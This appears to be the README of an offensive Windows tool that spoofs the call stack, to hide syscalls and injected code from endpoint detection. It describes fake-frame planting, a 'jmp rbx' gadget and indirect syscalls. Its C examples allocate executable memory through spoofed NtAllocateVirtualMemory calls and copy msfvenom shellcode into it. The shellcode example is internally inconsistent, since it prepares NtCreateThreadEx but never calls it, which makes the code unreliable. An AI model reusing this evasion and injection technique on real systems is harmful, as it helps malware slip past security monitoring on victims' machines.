# LoudSunRun
My shitty attempt at tampering with the callstack based on the work of namazso, SilentMoonWalk, and VulcanRaven

## Why?
Wanted to see how this magic shit worked and slapped random shit together. I think it works but don't quote me. All I do is stare at process hacker and go brr

## Overview
There are a few steps this abomination of c/asm does

1. Allocate args on stack
2. Generate fake frames
3. Prep syscall
4. Spoof the return address
5. Make the call

To perform these, a param struct is passed as arg 5 and the number of stack args is passed on arg 6. The param struct contains the following:
* address of the `jmp rbx` gadget  
* the original return address (for the Spoof function to return to)
* the stack sizes of our fake frames and gadget
* the address we want our fake frames to show on the call stack
* a SSN for syscalls (if included/ommited for non indirect syscalls, it does not affect anything)

The total stack size of the fake frames is calculated and the stack args are moved accordingly. A 0 is pushed onto the stack (which somehow cuts off the rest of the call stack??). 

Frames are then added, but in reverse order of appearence on the stack. They are planted like so  

1. Decrement stack pointer by the frame's size
2. Place the return address at the stack pointer

Then, the param struct is modified to "save" some information. The `fixup` function is loaded into the rbx, so when the function returns (to a `jmp rbx` gadget), it will land into `fixup`. Fixup then undoes all the funky stack pointer movement, restores the rbx, and jumps back to the OG return address.

## Implementation
A function can be called like so
```c
Spoof(arg1, arg2, arg3, arg4, &param, function, (PVOID)0);
```
Param is a struct containing some necessary information for the call to have fake frames added.  
The 6th argument is a pointer to the function to execute  
The 7th argument specifies the number of args to pass to the stack. It has to be at an 8 byte size.

Example of calling NtAllocateVirtualMemory with the indirect syscall method
```c 
/////////////////////////////
// Initialize param struct //
/////////////////////////////
PVOID ReturnAddress = NULL;
PRM p = { 0 };
NTSTATUS status = STATUS_SUCCESS;

//just find a JMP RBX gadget. Can look anywhere. I chose k32
p.trampoline = FindGadget((LPBYTE)GetModuleHandle(L"kernel32.dll"), 0x200000); 
printf("[+] Gadget is at 0x%llx\n", p.trampoline);

// Would walk export table but am lazy
ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("kernel32.dll"), "BaseThreadInitThunk")) + 0x14; 
p.BTIT_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.BTIT_retaddr = ReturnAddress;

ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
p.RUTS_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.RUTS_retaddr = ReturnAddress;

p.Gadget_ss = CalculateFunctionStackSizeWrapper(p.trampoline);

// Hard coded for my machine, theoretically you do FreshyCalls or something
p.ssn = 0x18; 

/////////////////////////////
// Initialize Syscall Args //
/////////////////////////////

PVOID alloc = NULL;
SIZE_T size = 1024;

///////////////////////////
// Call with fake frames //
///////////////////////////

Spoof((PVOID)(-1), &alloc, NULL, &size, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_EXECUTE_READWRITE);

```

If your machine works like mine, it will look like this

![Call Stack](https://i.imgur.com/aHWnX4S.png)

Example calling calc
```
unsigned char buf[] = //msfvenom brrr

PVOID alloc = NULL;
SIZE_T size = 1024;

PVOID pNtAllocateVirtualMemory = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")) + 0x12;
PVOID pMemcpy = GetProcAddress(LoadLibraryA("msvcrt.dll"), "memcpy");
PVOID pNtCreateThreadEx = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")) + 0x12;

p.ssn = 0x18;
Spoof((PVOID)(-1), &alloc, NULL, &size, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_EXECUTE_READWRITE);
Spoof(alloc, buf, (PVOID)276, NULL, &p, pMemcpy, (PVOID)0);
p.ssn = 0xc2;
PVOID hThread = NULL;
Spoof((PVOID)INFINITE, NULL, NULL, NULL, &p, Sleep, (PVOID)0);
Sleep(2000);
```
## Concerns
I have not done extensive testing with this. I only called a few functions and tried a local shellcode injection. Could be some edge cases I haven't considered. Also I don't have a huge background in this stuff, so there could be some inaccuracies. The r10-r15, rdi, and rsi are not restored cause I was too lazy to implement that.

Please reach out to me so I can learn cause I'm dumb as fuck. Godspeed.

## Credits
namazso - Return Address Spoofing
klezvirus - SilentMoonWalk 
william-burgess - Vulcan Raven
